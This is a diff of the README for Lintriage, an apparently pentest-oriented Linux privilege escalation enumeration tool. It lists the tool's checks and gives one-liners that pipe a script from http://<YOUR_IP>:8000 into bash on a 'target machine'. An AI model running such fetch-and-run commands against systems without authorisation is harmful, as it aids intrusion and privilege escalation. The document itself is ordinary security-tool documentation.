@@ -1,84 +1,39 @@
 # Lintriage
 
-Linux Privilege Escalation Auto-Triage Tool
+**Linux Privilege Escalation Auto-Triage Tool**
 
-## What is this?
-
-Lintriage runs the checks you actually need for Linux priv esc - no fluff, just the good stuff. It hits the common vectors and spits out findings in HIGH/MEDIUM/INFO format so you know what to focus on.
+Focused Linux priv esc enumeration - no fluff, just the checks that matter. Outputs findings in HIGH/MEDIUM/INFO format with nice colors.
 
 ## What it checks
 
-- **SUID binaries** - Finds setuid binaries, flags the dangerous ones
-- **Writable cron jobs** - Looks for writable cron files/directories
+- **SUID binaries** - Finds setuid binaries, flags dangerous ones
+- **Writable cron jobs** - Looks for writable cron files/directories  
 - **Writable systemd services** - Checks for writable service files
 - **Linux capabilities** - Finds files with dangerous capabilities
 - **Interesting files** - Scans for .bak, .old, .conf and other sensitive files
-- **Kernel version** - Checks if your kernel version has known exploits
+- **Kernel version** - Checks if kernel version has known exploits
 
-The output is color-coded and organized by severity (HIGH/MEDIUM/INFO) so you can quickly see what matters.
+## Quick Start
 
-## Getting started
-
+**On your machine:**
 ```bash
-git clone <repository-url>
-cd Lintriage
-```
-
-## Usage
-
-### On your machine (attacker box)
-
-The `lintriage.py` helper serves up the bash script and shows you exactly what commands to run:
-
-```bash
-# Show info
-python3 lintriage.py info
-
-# Check if build file exists
-python3 lintriage.py status
-
-# Start the server (default port 8000)
 python3 lintriage.py serve
-
-# Or use a different port
-python3 lintriage.py serve --port 8080
 ```
 
-When you start the server, it'll show you the download URLs and copy-paste ready commands for wget/curl.
-
-### On the target machine
-
-Once the server is running, grab the script on your target:
-
-**wget:**
-```bash
-wget http://<YOUR_IP>:8000/lintriage.sh -O lintriage.sh
-chmod +x lintriage.sh
-./lintriage.sh
-```
-
-**curl:**
-```bash
-curl http://<YOUR_IP>:8000/lintriage.sh -o lintriage.sh
-chmod +x lintriage.sh
-./lintriage.sh
-```
-
-**Or just run it directly (one-liner):**
+**On target machine:**
 ```bash
 wget -qO- http://<YOUR_IP>:8000/lintriage.sh | bash
 # or
 curl -s http://<YOUR_IP>:8000/lintriage.sh | bash
 ```
 
-The bash script has zero dependencies - just needs standard Linux tools that are already there.
+The helper will show you the exact commands to run. The bash script has zero dependencies - just standard Linux tools.
 
-## Output
+## Output Format
 
-Findings are split into three levels:
-
+Findings are organized by severity:
 - **HIGH** - Usually exploitable, check these first (red)
-- **MEDIUM** - Might be exploitable, worth a look (yellow)
+- **MEDIUM** - Might be exploitable, worth a look (yellow)  
 - **INFO** - Just info, might be useful (blue)
 
 ## Requirements
